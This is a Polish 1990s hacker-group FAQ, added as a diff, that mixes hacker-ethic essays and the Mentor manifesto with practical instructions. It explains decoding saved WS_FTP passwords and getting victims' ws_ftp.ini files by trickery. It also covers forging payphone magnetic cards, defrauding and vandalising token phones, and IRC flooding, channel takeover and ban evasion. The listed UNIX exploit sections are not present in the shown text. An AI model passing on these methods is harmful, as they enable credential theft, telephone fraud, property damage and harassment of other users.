@@ -1,0 +1,1677 @@
+                 FAQ of Dead Hackers Society
+                               ver: 0.5
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+WSZYSTKIE INFORMACJE SA TUTAJ ZAWARTE W CELACH EDUKACYJNYCH
+WSZYSTKO ROBISZ NA WLASNA ODPOWIEDZIALNOSC, DHS NIE PONOSI ODPOWIEDZIALNOWSCI ZA
+JAKIEGOLWIEK SZKODY ZWIAZANE Z PRAKTYKAMI TUTAJ OPISANYMI...
+!ZABRANIA SIE ZMIENIANIA TRESCI FAQ, W JAKIM KOLWIEK MIEJSCU!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+FAQ MOZE BYC DOWOLNIE KOPIOWANE I ROZPOWSZECHNIANE POD WARUNKIEM ZE W CALOSCI Z
+ZACHOWANIEM ORGINALNYCH TEXTOW
+================================================================================
+Cos od nas:
+Dead Hackers Society to nowa polska grupa, skladajaca sie z roznych osobnikow
+w zasadzie nie propagujemy tylko Hackingu. Jestesmy zainteresownai rowniez
+innymi rzeczami. Virii, destructing, phreackering itp... W zasadzie wszystko.
+Wiemy ze pewnie nasze FAQ moze zostac uznane za lamerskie, bo polska "scena"
+jest pelna roznych nietolerancyjnych osobistosci, niestety:( W tym faq mamy
+zamiar zajmowac sie nie tylko hackingiem ale tez innymi rzeczami...
+Jesli jestes zainteresowany podaniem jakis materialow do tego textu to bardzo
+prosze.. Zlap mnie na IRC i podaj txt, po przeczytaniu i uznaniu ze sie nadaje
+zostanie tutaj zamieszczony...
+W krotce powinna byc gotowa nasza publiczna strona WWW...
+================================================================================
+* -nowe
++ -uaktualnienie
+- -poprawione
+
+
+* 0. WSTEP 
+   0.1 Cos o DHS 
+   0.2 Jakie jest zadanie tego FAQ
+
+* 1. Hacking (bardziej teroria i idee) :LordCreg
+   1.1 O co w tym wszystkim chodzi? :LordCreg
+   1.2 Etyka Hackera : AnGel
+   1.3 Manifest : zamieszczone przez Crega
+   1.4 Refleksja :znalezione przez LordCreg`a
+   1.5 Fuck the system: LordCreg
+   
+* 1,5. HACK
+   1,5.1 Bug w WS_FTP: Misiek
+ 
+* 2.Phreak :Hellfire
+   2.0. Co to jest phreakering :LordCreg
+   2.1. Karty magnetyczne :Hellfire
+   2.2. Budki telefoniczne na zetony :Hellfire
+
+* 3. IRC war
+   3.1. Po co prowadzi sie wojny na IRC? :Hellfire
+   3.2. Co to jest bot? :Hellfire
+   3.2.1. Jak zabic bot-a? :Hellfire
+   3.3. CTCP Flood :Hellfire
+   3.4. Net Split :Hellfire
+   3.5. Jak nie dostac bana? :Hellfire
+   3.6. Jak ominac bana? :Hellfire
+   3.7. Jak sie pozbyc restrykcji? :Hellfire
+   3.8. Kilka sztuczek :Hellfire
+
+* 4. Lamanie systemow UNIXowych
+   4.1. UNIX - podstway :Hellfire
+   4.2. Co nam bedzie potrzebne :Hellfire
+   4.3. Wlamywanie - teoria :Hellfire
+   4.4. Jak zdobyc plik passwd? :Hellfire
+   4.5. Jak zdobyc plik shadow? :Hellfire
+   4.6. Mam konto... i co? :Hellfire
+   4.7. Sendmail 
+      4.7.1 Sendmail 8.8.4 :Hellfire
+   4.8. Exploity
+      4.8.1. Debian 1.1 :Hellfire
+      4.8.2. RedHat :Hellfire
+           4.8.2.1. dump bug :Hellfire
+           4.8.2.2. abuse :Hellfire
+           4.8.2.3. rootshell :Hellfire
+      4.8.3. Single :Hellfire
+      4.8.4. FreeBSD 2.2.1 :Hellfire
+      4.8.5. Linux-y :Hellfire
+      4.8.6. HTTP/1.0 Server :Hellfire
+      4.8.7. AIX 4.1/4.2 :Hellfire
+      4.8.8. Windows 95/NT :Hellfire
+      4.8.9. SunOs 4.1.1 Sparc 20 :Hellfire
+
+* 5. The Microsoft Windows 95
+   5.1. Kilka slow o Bilu Gates-ie i jego windowsie :Hellfire
+   5.2. Jak zabic windowsa? :Hellfire
+   5.3. WWWWW - Windows W World Wide Web :Hellfire
+   5.4. Internet Provider: Nemes  
+
+ 
+
+
+--------------------------------------------------------------------------------
+0 WSTEP
+
+0.1) Cos o DHS:
+
+Wiec DHS to nowa grupa na polskiej "scenie" o ile to wogole
+mozna nazwac scena... Naszym zadaniem jest nauczyc lamera co wiedziec powinien,
+a komus kto juz cos wie zapewnic dalsza edukacje... Wiemy ze moze bedziemy
+wyszydzani przez niektorych osobnikow ze lameria i inne bzdety, ale nam to WALI!
+Grupka zajmuje sie nie tylko hackingiem. Jestesmy otwarci na wszelkie propozycje
+takie jak:
+hacking
+phreaking
+virii (jesli ktos ma ochote)
+i inne...
+
+Tylko jesli ktos chce na przyklad zostac tworca virii, to przydalo by sie zeby
+w naszych szeregach bylo paru gosci o takich zainteresowaniach, coby sobie na
+wzajem pomagali:)
+Planujemy podzielic grupe na sekcje o danych "profilach" i bedzie spx.
+
+0.2) Jakie jest zadanie tego FAQ:
+
+To faq ma za zadanie wyjasnic podstawy i niektore zagadnienia zwiazanie z
+roznymi tematami. Glownie hackingu. Nie bedzie tu odrazu napisane jak sie
+wlamac do NASA, bo to nie o to chodzi. Jesli jestes calkowitym lamerem, ktory
+nie wiem co to shadow, to sie tu tego dowiesz. Dowiesz sie jaka jest budowa
+pliku passwd i pare innych rzeczy... A jesli chcialbys dodac cos, bo napisales
+jakis text, to nie ma sprawy.Wyslij txt na adres: grzywacz@ptk.krakow.pl i jesli
+bedzie sie nadawal, to zamiescimy go tutaj:)
+
+1. Hacking
+Tu sa raczej txty sklaniajace do refleksji, a nie o hackingu jako takim, ale
+wypadalo by wiedziec jakie sa hackerski idee i wogole caloksztalt tego
+wszytskiego.
+
+ 1.1 O co w tym wszystkim chodzi?
+
+Heh wiec chcialbys zostac hackerem....Hmmm na pewno chcesz?? Wiesz wogole o co
+w tym wszytskim chodzi?? Myslisz ze hacking polega na wlamaniu sie do systemu
+i wykasowniu szystkich twardych dyskow, lub namieszaniu tak zeby
+nic juz nie dalo sie zrobic?? Jesli tak myslisz, to jestes w bledzie!!!
+Idea hackingu jest bardzo piekna, tylko niekiedy bardzo trudna w praktyce.
+WOLNOSC SLOWA ORAZ INFORMACJI!!!! Jak to jest napisane w 2 numerze H@CKPL:
+Informacja jest wladza!Wuolnic informacje!!
+Czyli wszystko dla wszytskich bez podzialow!
+Wlamujemy sie po to zeby poznac doladniejsza budowe i zasade dzialania danego
+systemu... Mamy satysfakcje z tego ze zlamalismy kolejny sys, ze jestesmy lepsi.
+Ludzie sie wlamuja, zmieniaja rzadawa strone WWW i mysla ze juz z nich wielcy
+hackerzy... Nie chodzi mi tu o to aby zbruzgac tych z DAMAGE.INC ale... 
+Niestety w ostatnich czasach hacketyka upada i to bardzo nisko:(
+(chodzi mi tu o POLSKE)
+Nie mowie ze ja odrazu jestem hackerem i wogole najleprzy, bo oczywiscie tak 
+nie jest...
+A oto dobry text autorstwa Angela mniej, wiecej nakreslajacy o co w tym
+wszystkim chodzi.
+
+ 1.2 Etyka Hackera by AnGel
+
+				Etyka hackera
+
+Przebywajac na IRC`u czesto w pewnym momencie ktos cie pyta "czy ty jestes hackerem" ?
+A ty na to nieskromnie odpowiadasz "Jasne lamerze !!! " ;) ( to tylko przyklad ).
+No wlasnie, kim jest prawdziwy hacker ? Po czym to poznac ?
+Hacker w zlym porownaniu moze byc od uzytkownikia komputera do kogos, kto niszczy wszystko
+do czego moze sie wlamac. 
+Np. idioci, ktorzy maja nadzianych starych dostaja komputery. Koles ma zalozmy Pentium II
+i modem 33,600. Maja dostep do sieci przez TP SA i sa boss`ami. Jakos dostaja sie do 
+naprawde dobrego ;) systemu i znajda kilka plikow o haczeniu. Albo jakis prawdziwy hacker
+ulituje sie nad lamerem i da mu np. kilka numerow etc. Palant dostaje sie do tego systemu
+Sciaga jakies pliki i kasuje wszystko co wpadnie mu w rece. Prawdziwy lamer.
+Prawdziwy hacker...no wlasnie, kim on jest ?
+Prawdziwi hackerzy sa inteligenti ;) poniewaz musza tacy byc. Chodza do naprawde dobrych 
+szkol poniewaz nie maja nic lepszego do roboty, albo nie chodza bo szkola jest okropnie
+nudna. Jednak wiekszosc chodzi do szkol ;). Prawdziwy hacker chce wiedziec wszytsko. 
+Hackerzy sa znudzeni, poniewaz szkola uczy nudnych rzeczy w kolko, nie wprowadza nic nowego,
+nic co wyzywalo by na pojedynek.
+Prawdziwi hackerzy sa przede wszystkim cierpliwi. Jesli taki nie jestes to po co ciezko
+pracujesz hackujac pojedynczy system, dla jednego nedznego konta, na ktorym nawet nie
+mozna postawic bota z powodu slimaczego transferu ;)))))
+Prawdziwy hacker NIE WLAMUJE sie do systemu zeby zabic wszystko albo sprzedac dane komus
+obcemu. Prawdziwi hackerzy pragna sie uczyc, albo chca udowadniac sobie ze sa na tyle 
+dobrzy by wlamac sie do obcego systemu ( ach ta duma...;). Pragna poruszac sie bez 
+ograniczen w systemie w ktorym nigdy nie byli. Chca explorowac "swiaty" ktore fascynuja
+ich egzotyka kont i szarych uzytkownikow systemu... Po co niszczyc cos, co moze dawac tyle
+satysfakcji komus innemu ? Po co grupka lamerow ma psuc opinie elicie ?
+Prawdziwi hackerzy sa przezorni. Mam na mysli to ze trzymaja mordy zamkniete na klodke.
+Nie zadaja poklasku swoich dokonan ( oczywiscie sa wyjatki ). Powiesz kumplom ze szkoly
+a w niedlugim czasie ludzie z wladza dowiedza sie kto ty jestes, co zrobiles i masz klopoty...
+Za bardzo nie wiem komu ten plik moze sluzyc, moze komus kto to przeczyta i wreszcie pozna
+prawde o hackerach. To nie sa klamstwa ani wymysly. Pamietaj o tym ze grupka lamerow nie moze
+odpowiadac za wszystkich hackerow. Tu nie ma zasady "jeden za wszytskich, wszyscy za 
+jednego". Ten txt ma uzmyslowic ludziom, ktorzy lubia miec przyczepiona plakietke "HACKER"
+ze nie w tym rzecz.
+
+
+									AnGeL
+ 1.3 Manifest:
+
+A oto txt, nazwany manifestem hackerow, w jezyku angielskim, jak bede mial
+chwile czasu i ochoty to postaram sie go przetlumaczyc:)
+
+Mentor's Last Words
+
+"Mentor's Last Words"
+
+Another one got caught today, it's all over the papers.  "Teenager
+Arrested in Computer Crime Scandal", "Hacker Arrested after Bank
+Tampering"... Damn kids.  They're all alike. But did you, in your three-
+piece psychology and 1950's technobrain, ever take a look behind the
+eyes of the hacker?  Did you ever wonder what made him tick, what forces
+shaped him, what may have molded him? I am a hacker, enter my world...
+Mine is a world that begins with school... I'm smarter than most of the
+other kids, this crap they teach us bores me...  Damn underachiever.
+They're all alike. I'm in junior high or high school.  I've listened to
+teachers explain for the fifteenth time how to reduce a fraction.
+I understand it.  "No, Ms. Smith, I didn't show my work.  I did it in
+my head..." Damn kid.  Probably copied it.  They're all alike.
+I made a discovery today.  I found a computer.  Wait a second, this is
+cool.  It does what I want it to.  If it makes a mistake, it's because I
+screwed it up.  Not because it doesn't like me...  Or feels threatened by
+me.. Or thinks I'm a smart ass.. Or doesn't like teaching and shouldn't be
+here... Damn kid.  All he does is play games.  They're all alike. And then
+it happened... a door opened to a world... rushing through the phone line
+like heroin through an addict's veins, an electronic pulse is sent out,
+a refuge from the day-to-day incompetencies is sought... a board is found.
+"This is it... this is where I belong..." I know everyone here... even
+if I've never met them, never talked to them, may never hear from them
+again... I know you all... Damn kid.  Tying up the phone line again.
+They're all alike... You bet your ass we're all alike... we've been
+spoon-fed baby food at school when we hungered for steak... the bits of
+meat that you did let slip through were pre-chewed and tasteless.
+We've been dominated by sadists, or ignored by the apathetic.  The few
+that had something to teach found us willing pupils, but those few are
+like drops of water in the desert.
+   This is our world now... the world of the electron and the switch, the
+beauty of the baud.  We make use of a service already existing without
+paying for what could be dirt-cheap if it wasn't run by profiteering
+gluttons, and you call us criminals.  We explore... and you call us
+criminals.  We seek after knowledge... and you call us criminals.  We
+exist without skin color, without nationality, without religious bias...
+and you call us criminals. You build atomic bombs, you wage wars, you
+murder, cheat, and lie to us and try to make us believe it's for our
+own good, yet we're the criminals.
+   Yes, I am a criminal.  My crime is that of curiosity.  My crime is
+that of judging people by what they say and think, not what they look like.
+My crime is that of outsmarting you, something that you will never
+forgive me for. I am a hacker, and this is my manifesto.  You may stop
+this individual,but you can't stop us all... after all, we're all alike.
+                            +++The Mentor+++
+[May the members of the phreak community never forget his words -JR]
+
+ 1.4 Refleksja
+
+Autor jest nie znany, ale jedno jest pewne,wedlug mnie ma racje!![LdCreg]
+Aha w 100% autor jest z Polski, TO NIE JEST TLUMACZENIE
+
+Moja refleksja
+Jestesmy mala drobinka w swietle ogarniajacego nas Wrzechswiata...
+Wszytsko jest niczym w porownaniu z Dzielem Stworzenia... Zycie nie ma sensu,
+a jesli ma, to tylko w naszym marnym swiecie nazwanym Ziemia... Wszytsko jest
+tu wzgledne... A Wielki patrzy i mysli co bedzie dalej...
+Nie jestesmy sami, jest wiele innych cywilizacji we Wrzechswiecie.
+NIektore sa bardziej rozwiniete od nas, sa na wyzszym stopniu duchowym... I dla
+nich zupelnie inne wartosci maja wyzszy sens. W tej chwili nie widze sensu
+zycia. Po co sie czlowiek rodzi jak i tak umrze i przejdzie do wyzszego poziomu
+rozwoju duchowego? Co ma sens?? Milosc, jak sie ma kogos, kto kocha, to moze
+i tak. Otoz ja mam taka osobe, ktora kocham, ale mimo wszystko nie stracilem
+wiary w stare wartosci... Po co zyjemy? Jaki jest w tym sens?
+Gdzies pisali ze Stworca stworzyl czlowieka, poniewaz byl samotny... A jest
+napisane ze bedzie OMEGA, ale po co niszczyc cos co sie stworzylo dla wyzszego
+celu??A na swoje podobienstwo, poniewaz czlowiek umie kochac, tak jak Bog, ktory
+umilowal czlowieka nade wszystko...
+Jestem pseudo Anarchista, bo nie widze sensu tego calego gowna...
+Prawie wszystko mi wali! Ale niestety nie mozemy powiedziec sobie: "DOSC!"
+Bo to wszystko ma sens, ale tylko w naszym malym swiatku, w ktorym zyjemy.
+NIektorzy nie zauwazaja, ze ten maly swiatek nie ma wyzszego sensu. I wszysko
+jest w nim do chrzanu.
+
+Jestem Anarchista, ale przede wszystkim Hackerem, czyli buntownikiem
+Chce odkrywac nie zbadane systemy, poznawac ich budowe. I miec satysfakcje
+ze zlamalem kolejny i ze jestem leprzy od innych, ktorzy to stworzyli i
+zarzadzaja tym shitem...
+Ktos moze powiedziec co za palant, pisze najebane texty i wogole. Jesli tak
+myslisz, to znaczy ze wogole nie pojales idei tego textu, jego przeslania.
+Anonim...
+
+
+1.5 FuCk da SyStEm by LordCreg:
+
+Jestesmy hackerami... odkrywamy nie zbadane przestrzenie komputerowych
+systemow. Pomagamy odkrywac nowe bugi w zapezpieczeniach. Wiec dlaczego
+nazywaja nas przestepcami. Poniewaz potrafimy zalatwic sobie nieograniczony
+dostep, do niektorych systemow, wbrew woli ich marnych administratorow. Jest
+to im nie na reke... Ale my mamy to gdzies i dalej robimy swoje. Pod oslana
+spooferow i killogow. Dlatego nie moga nam nic udowodnic, chyba ze na prawde
+spieprzymy robote i nas namierza, ale i tak musieli by nas zlapac na goracym
+uczynku. Ale i tak sa marne szanse na zlapanie nas, jako nielegalnych
+komputerowcow w swietle prawa, ktore i tak niegdy nie bedzie doskonale...
+Rozpoznajecie ten cytat?:
+
+"Budujesz bomby atomowe, wszczynasz wojny, mordujesz i oszukujesz,
+ oklamujesz nas i probujesz nam wmowic ze to dla naszego dobra, a to my
+ jestesmy przestepcami.
+
+ Tak jestem przestepca. Moim przestepstwem jest ciekawosc.
+ Moim przestepstwem jest ocenianie ludzi na podstawie tego co mowia i musla,
+ nie jak wygladaja. Moim przestepstwem jest to ze jestem madrzejszy od
+ ciebie i nigdy mi tego nie wybaczysz. Jestem hackerem, a to jest moj
+ manifest. Mozesz powstrzymac mnie, ale nie jestes w stanie powstrzymac
+ nas wszystkich, bo przeciez wszyscy jestesmy tacy sami..."
+
+Ten cytat pochodzi z slawnego manifestu hackerow, caly txt znajduje sie wczesniej
+
+Nie wiem komu moze ten text posluzyc, ale poruszylem tu sprawe tylko i
+wylacznie socjologiczna, z reszta jak zwykle.
+
+1,5 HACK
+
+1,5.1 Bug w WS_FTP
+Opisze tu buga zawartego w programie WS_FTP ...
+Bug ten zostal zauwazony przez Miloscha Meriaca (podobno...tak twierdzi P0wer w swoim faq-u).
+Polega on na tym ze program ten w pliku  ws_ftp.ini  zapisuje hasla z kont z ktorymi 
+laczy sie uzytkownik.
+Hasla te sa oczywiscie zakodowane lecz metoda kodowania jest slabiutka.....
+Oto przykladowy wycinek z ws_ftp.ini :
+
+      [Hacker]
+      HOST=www.hacker.org
+      UID=hacker
+      PWD=616465687778
+      LOCDIR=C:\
+      DIR=/
+
+A wiec po kolei....
+Metoda uzywana przez ws_ftp polega na zamienianiu hasla na hexy i odjecia od liczby decymalnej 
+miejsca na ktorym stoi wartosc.
+tzn.: haslo: 616465687778    dzielimy na czesc po dwie liczbg (decymalnie)
+
+61      64      65     68    77    78
+-0      -1      -2     -3    -4    -5
+czyli
+61      63      63     65    73    73     -    jest to juz rozkodowane haslo zapisane w systemie
+[postawiamy litery]                                 						szesnastkowym
+ a       c       c      e     s     s                                            
+
+A ot przyporz¹dkowane wartoœci decymalne i znaki...:
+
+a - 61       A - 41      0 - 30      , - 2C
+b - 62       B - 42      1 - 31      . - 2E
+c - 63       C - 43      2 - 32      < - 3C
+d - 64       D - 44      3 - 33      > - 3E
+e - 65       E - 45      4 - 34      ? - 3F
+f - 66       F - 46      5 - 35      | - 7C
+g - 67       G - 47      6 - 36      ` - 60
+h - 68       H - 48      7 - 37      ' - 27
+i - 69       I - 49      8 - 38      : - 3A
+j - 6A       J - 4A      9 - 39      ; - 3B
+k - 6B       K - 4B                  " - 22
+l - 6C       L - 4C      ! - 21      + - 2B
+m - 6D       M - 4D      @ - 40      = - 3D
+n - 6E       N - 4E      # - 23      - - 2D
+o - 6F       O - 4F      $ - 24      _ - 5F
+p - 70       P - 50      % - 25      \ - 5C
+q - 71       Q - 51      ^ - 5E      / - 2F
+r - 72       R - 52      & - 26      [ - 5B
+s - 73       S - 53      * - 2A      ] - 5D
+t - 74       T - 54      ( - 28      { - 7B
+u - 75       U - 55      ) - 29      } - 7D
+v - 76       V - 56
+w - 77       W - 57
+x - 78       X - 58
+y - 79       Y - 59
+z - 7A       Z - 5A
+
+
+Oto kilka przyk³adów....
+
+34333237657827
+
+
+34    33    32    37    65    78    27
+-0    -1    -2    -3    -4    -5    -6
+
+34    32    30    34    61    73    21    -    rozkodowane haslo w systemie szesnastkowym
+[podstawiamy litery]
+4      2     0     4     a     s     !
+
+
+Kolejny przyk³ad:
+
+746275677367
+
+
+74    62    75    67    73    67
+-0    -1    -2    -3    -4    -5
+
+74    61    73    64    6F    62
+[podstawiamy litery]
+t     a     s     d     o     b
+
+
+I to chybaa na tyle......    wszystko jest chyba jasne....
+
+Na zdobycie pliku ws_ftp.ini sa dwa podstawowe sposoby....
+Uzywamy ftp search (http://ftpsearch.ntnu.no) i sciagamy wszystkie dostepne pliki.....
+Druga metoda polega na wt³udzeniu od kogos tego pliku...
+np.: za szko³y, pracy..... lub od jakiegos lamera (ale musi byc to totalny lamer bo jak 
+zna sie tylko troche na komputerach to wyczuje szwindel)
+Puszczamy gosciowi kitze np: zapsul nam sie WS_FTP i rzeby nam przeslal 
+plik od siebie z komputera....
+
+I to juz koniec....
+         
+                    ------------------------------------
+                    -             _Misiek_             -
+                    -        bear@friko.onet.pl        -
+                    -          bear@kki.net.pl         -     
+                    -      http://kki.net.pl/bear      -
+                    ------------------------------------
+
+  2. Phreak
+
+   Doszedlem do wniosku, ze rozdzial o phreaku moze zaszkodzic
+   tylko jednej firmie, ktorej zreszta nie lubie  (nie  powiem
+   jak sie nazywa bo mi odetna telefon) :))).
+
+  2.0 Co to jest Phreaking by LordCreg
+
+Wiec phreakering to kolejny odlam komputerowej subkultury, tak jak hacking:)
+Polega on na tym, aby obrabiac telefony, tak aby moc dzwonic za darmo...
+Na przyklad budki tel itp. Aby miec darmowe wyjscie na caly swiat...
+Oczywiscie wszyscy znamy bardzo dobrze nasza kochana(uu ale wazelina)
+Telekomunikacje Polska s.a., ktora jest monopolista na polskim rynku...
+NIestety to ONA dyktuje nam ceny polaczenia telefonicznego, ktore wynosi
+19 groszy za kazde 3 minuty rozpoczetego polaczenia, po taryfie lokalnej...
+Jest to jedna z najdrozszych stawek w Europie i jedna z najgorszej jakosci
+swiadczonych uslug... dlatego nie lubimy TP sa, ale jestesmy nania skazani...
+Moze po prywatyzacji to sie zmieni... mam szczera nadzieje ze  tak!
+
+
+
+   2.1. Karty magnetyczne
+
+    Na poczatek zarys dzialania:
+
+    ______________________________
+    |                            |
+    | Telekomunikacja Polska SA  |
+    |                            |
+    |                            |
+    | #########################  |
+    |           0           /100 |
+    |  --1-- --2-- --3-- --4--   |
+    ------------------------------
+
+    Czesc magnetyczna karty jest podzielona na 4 czesci.  Jest
+    tam zapisana  max  ilosc  impulsow.  Czesci  te  moga  byc
+    namagnesowane dwoma biegunami (+ -) - mozna  to  sprawdzic
+    biorac magnes i przesunac go dosc szybko nad  powieszchnia
+    magnetyczna karty (poczujesz  wtedy  ze  magnes  raz  jest
+    lekko przyciagany, a raz lekko odpychany). Najlepiej wtedy
+    oddtworzyc te same pola mag. na tasmie wideo  przyklejonej
+    na miejsce oryginalengo paska. Pasek trzeba przykleic  tak
+    , zeby nie bylo zadnych widocznych  zmarszczen  (najlepiej
+    uzyc tasmy samoprzylepnej  klejacej  z  dwuch  stron).  Ta
+    metoda dziala i  jak  ktos  zrobi  to  dokladnie  tak  jak
+    napisalem to powinno mu dzialac.Dobrze jest zostawic sobie
+    kilka impulsow (2-3) na karcie przed rozpoczeciem ekspery-
+    mentow,    poniewaz    budka    prawdopodobnie     zmienia
+    namagnesowanie karty  przy  zjadaniu  ostatniego  impulsu.
+    Jezeli chcemy zmienic maksymalna ilosc impulsow  wystarczy
+    przylaczyc  silne  pole  magnetyczne  do  karty  i  chwile
+    zostawic ( dla silnych elektromagnesow wystarcza  okolo  2
+    minut).
+
+   2.2. Budki telefoniczne na zetony
+
+    Sporo budek tego rodzaju nie me wyjscia na  miedzymiastowa
+    , ale mozna to zawsze ominac i rozmawiac z  calym  swiatem
+    za 17gr/3min. Robimy to tak:
+    1) wrzucamy zeton
+    2) wystukujemu 0 - nie  z  klawiatury  ale  bardzo  szybko
+       pukamy w widelki 10 razy. Zeby sie latwiej  liczylo  ja
+       uzywam metody ze licze trojkami ( trzy trojki  i  potem
+       jeszcze raz - 1231231231 )
+    3) wstukujemy reszte numeru juz bez zera np. 700xxxxx
+
+    Jest jeszcze taka metoda:  wyrwac  klapke  z  zetonami :))
+    - nie trzyma sie wcale tak mocno
+
+    Mozna jescze traktowac budke zapalarka do gazu albo  duzym
+    kondensatorem ( jeden biegun do obudowy kabla sluchawki, a
+    drugi probowac z roznymi czesciami  metalowymi  aparatu ).
+
+
+
+
+ 3. IRC war
+
+   3.1. Po co prowadzi sie wojny na IRC?
+
+      Na pewno nie raz wkurzyles kogos kto na dodatek byl opem
+      , wtedy on wykopal cie z kanalu albo zabanowal ci konto.
+      Wtedy poczules chec zemsty. Teraz nadejdzie jej czas!:-)
+
+   3.2. Co to jest bot?
+
+      Bot jest to program ktory imituje uzytkownika. Ma zapro-
+      gramowany rozne funkcje taki jak wyrzucanie  za brzydkie
+      slowa, autoop.  Bot  jest zjawiskiem bardzo wkurzajacym,
+      bo jako tempa maszyna,czesto zle zaprogramowana obrzydza
+      zycie reszcie uzytkownikow IRC. Czesto zdarza sie ze je-
+      dynym opem jest bot, wtedy na kanal zlazi sie  lameria i
+      nie ma sposobu na powyrzucanie badziewia. A wiec  ludzie
+      nie stawiajcie botow, a jak musicie  to najpierw utworz-
+      cie sobie inny kanal  i tam go  testujcie. I wprowadzcie
+      mu funkcje, ze jak  zostanie  pozbawiony opa to niech po
+      prostu wyjdzie z kanalu - jak  jakis bot siedzi na kana-
+      le  na  ktorym nie  ma opow nie ma mozliwosci, zeby ktos
+      nim zostal.
+
+      3.2.1. Jak zabic bot-a?
+
+       Najpierw trzeba zobaczyc co bot robi  i  poszukac  jego
+       slabych punktow.  Najprostrza  metoda  to  spowodowanie
+       "execes flood"-a, nastepuje to jak ktos za duzo  wysyla
+       na kanal, wtedy serwer wyrzuca go za flood-a. Najlepiej
+       jak bot odpowiada jakims glupim  komunikatem  na  rozne
+       rzeczy takie jak ping czy msg. Wchodzisz wtedy  kilkoma
+       uzytkownikami na IRC i kazdy np. pinguje bota 50  razy,
+       gdy bot wykryje pingowanie czasami  puszcza  na  public
+       komunikat w stylu "HELLFIRE proboje mnie floodowac!", a
+       jak odpowie tak 200 razy w ciagu sekundy :)) to  bedzie
+       mial wylot z serwera za flood-a. Mysle ze po tym  przy-
+       kladzie nikt nie bedzie mial  problemow  z  wymysleniem
+       innych metod na pozbycie sie natreta.
+
+   3.3. CTCP flood
+
+      CTCP (nie mylic z CCCP :-]) jest to zbior polecen  ktore
+      wysylacja do komputera docelowego  pytanie,  a  komputer
+      docelowy wysyla  odpowiedz.  Na  przyklad  komenda  PING
+      wysyla do koputera docelowego pytanie w  stylu - ZYJESZ?
+      a komputer docelowy odpowiada - ZYJE, wtedy jest jeszcze
+      zapisany czas odpowiedzi. Mniej wiecej 3-4  uzytkownikow
+      wysyla do ofiary pakiety po okolo 50 pytan (tak zeby nie
+      wyleciec za flooda) - PING , VERSION  albo  inne.  Wtedy
+      ofiara odpowiada na te  wszystkie  pytania  i  w  ktorym
+      momecie serwer wysyla swoje PING i nie otrzymujac  znaku
+      zycia od niego wyrzuca go z serwera jako tego ktory  sie
+      juz rozlaczyl.
+
+   3.4. Net Split
+
+      Netsplit jest to slowo okreslajace rozlaczenie sie sieci
+      Jezeli siec serwerow IRC wygladala by tak:
+
+                3-----4----5----6----7
+                |     |    |    |    |
+                1--2--8    9   10    11
+                   |       |    |
+                  12---13  14---15
+
+      To jezeli netsplit nastapi miedzy serwerami  6  i  7  to
+      uzytkownicy serwerow 7 i 11 zostana  odcieci  od  reszty
+      sieci. Takie rozlaczenie wykrywa np program link looker.
+      Wtedy laczymy sie z takim  serwerem  komenda  /server  i
+      prawdopodobnie jestesmy jedyna osoba  na  kanale,  czyli
+      mamy OP-a! Wtedy mozemy odpalic program Multi Colide Bot
+      i czekac, albo tylko czekac. Gdy sieci sie polacza wtedy
+      mamy automatycnie status operatora!
+
+   3.5. Jak nie dostac bana?
+
+      Po pierwsze - nie podskakuj do operatorow!  Ale  nie  to
+      bedzie tu tematem, a to jak nie dostac bana np za flooda
+      , po prostu  puszczamy  flooda  i  szybko  wychodzimy  z
+      kanalu, a jeszcze lepiej z serwera. Wtedy nikt nie zdazy
+      sprawdzic z kad dzwonisz i nie zalozy ci  bana.  Chociaz
+      ta metoda dziala tylko na boty, bo przy wejsciu na kanal
+      serwer podaje z jakiego adresu dzwonisz.
+
+   3.6. Jak ominac bana?
+
+      Po pierwsze to trzeba unikac dostawania banow(punkt 1.5)
+      , ale jak juz sie zdazy do nie trzeba sie wcale martwic.
+      Sa dwa rodzaje banow,  jeden  dziala  na  nick  (pseudo)
+      uzytkownika, a drogi na adres serwera  przez  ktory  sie
+      laczysz. W pierwszym wystarczy  zmienic  nick-a  komenda
+      /NICK twoj_nowy_nick , a w drogim jest nieco gorzej, ale
+      wszystko jest do zrobienia. Po pierwsze sprawdzamy na co
+      dostalismy bana komenda /mode #kanal b  wtedy  dostajemy
+      liste banow, Piszemy  /whois  twoj_nick  i  widzisz  tam
+      adres  pod   ktorym  jestes  rozpoznawany.  Jezeli  masz
+      bana na cos w rodzaju *.gdynia.tpnet.pl a twoj adres  do
+      tego pasuje, to czy nie przydalo by sie zmienic  twojego
+      adresu na np. *.124.112.32 :)). Adresu jako  takigo  nie
+      da sie zmienic, mozna go za to  przedstawic  jako  adres
+      DNS (literowy), albo IP  (4 liczby).  Jezeli  dostalismy
+      bana na jeden z nich nastepnym razem trzeba sie  pojawic
+      pod innym. Wiekszosc serwerow podaje adrs DNS, podam  tu
+      ten, ktorego ja uzywam zazwyczaj gdy chce zeby ujawniono
+      tylko moj adres IP - irc.fu-berlin.de.  I  to  wszystko.
+      Jezeli ktos mimo wzystko zalozy nam bana na  nasz  adres
+      IP to wystarczy sie  rozlaczyc  i  polaczyc  jescze  raz
+      , ale dziala to tylko na TPSA.
+
+
+   3.7. Jak sie pozbyc restrykcji?
+
+      Restrykcje na IRC - jest to atrybut (r) przyznawany przy
+      podlaczeniu do serwera  uzytkownikom  uzywajacym modemu.
+      Ogranicza on w sposob  istotny  mozliwosci  uzytkownika:
+      nie mozna zmienic nick-a w trakcie  trwania  sesji,  nie
+      zostaje sie operatorem kanalu gdy sie go zaklada,  nawet
+      gdy  ktos  inny  da  ci  status  operatora  nie   mozesz
+      korzystac  z  jego  uprawnien.  Zeby  sie  pozby c  tego
+      natrectwa   napisz   po   polaczeniu   sie  do  serwera:
+      /mode twoj_nick -r+i   ale   prawdopodobienstwo   za  to
+      zadziala jest niewielkie  (ostatnio  dzialalo  tylko  na
+      serwerze krakow.irc.pl). Droga metoda jest laczenie  sie
+      przez serwer ktory nie naklada restrykcji na uzytkownika
+      ja znam taki tylko jeden (irc.bt.net) ale nawet nie jest
+      on taki wolny i dosc czesto wystepuje  na  nim  netsplit
+      (czy to zle, czy dobrze osadzcie sami).
+
+   3.8. Kilka sztuczek
+
+      Tu przedstawie kilka przydatnych wiadomosci o IRC:
+      Kanal #5,0 - jest to kanal  po  wejsciu  na  ktory  gosc
+      jest wyrzucany ze wszystkich kanalow na ktorych jest :-)
